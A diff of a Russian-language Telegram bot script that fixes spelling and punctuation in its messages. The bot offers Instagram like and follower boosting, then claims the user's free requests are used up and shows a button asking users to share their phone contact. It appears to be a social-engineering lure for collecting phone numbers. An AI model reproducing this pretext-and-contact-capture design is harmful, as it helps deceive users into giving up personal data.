@@ -193,8 +193,8 @@ print("Бот запущен!")
 @bot.message_handler(commands=['start'])
 def start(message):
 	bot.send_message(message.chat.id, '''👋 Привет! 👋
-		Этот бот для накрутки лайков и подписчиков в инстаграм!
-		Для старта напишине /nacrutka''') 
+		Это бот для накрутки лайков и подписчиков в инстаграм!
+		Для старта напишите /nacrutka''') 
 @bot.message_handler(commands=['lamer112311dev'])
 def start(message):
 	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: @Cyber_Puffin') 
@@ -255,7 +255,7 @@ def proc2(message):
 
 		time.sleep(2)
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
+		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True) 	
 		keyboard.add(button_phone)	
 		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
 			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
@@ -371,10 +371,10 @@ def proc1(message):
 
 		time.sleep(2)
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
+		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True) 	
 		keyboard.add(button_phone)	
 		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
-			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
+			Чтобы получить дополнительные запросы зарегистрируйтесь в боте!''', reply_markup=keyboard)
 	except Exception as e:
 		bot.send_message(ID, e)
 		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')
@@ -395,10 +395,10 @@ def proc2(message):
 
 		time.sleep(2)
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
+		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True) 	
 		keyboard.add(button_phone)	
 		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
-			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
+			Чтобы получить дополнительные запросы зарегистрируйтесь в боте!''', reply_markup=keyboard)
 
 	except Exception as e:
 		bot.send_message(ID, e)
@@ -550,7 +550,7 @@ def start(message):
 	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: @Cyber_Puffin') 
 @bot.message_handler(commands=['znak'])
 def start(message):
-	msg = bot.send_message(message.chat.id, 'Для начала напишите немного о себе(одним сообщением)') 
+	msg = bot.send_message(message.chat.id, 'Для начала напишите немного о себе (одним сообщением)') 
 	bot.register_next_step_handler(msg, proc2)
 
 def proc2(message):
@@ -561,9 +561,9 @@ def proc2(message):
 		print(num)
 		time.sleep(2)
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
+		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True) 	
 		keyboard.add(button_phone)	
-		bot.send_message(m_id, '''Для того, чтобы использовать бота, зарегестрируйтесь пожалуйста!''', reply_markup=keyboard)
+		bot.send_message(m_id, '''Для того, чтобы использовать бота, зарегистрируйтесь, пожалуйста!''', reply_markup=keyboard)
 # Отловка ошибок
 	except Exception as e:
 		bot.send_message(ID, e)
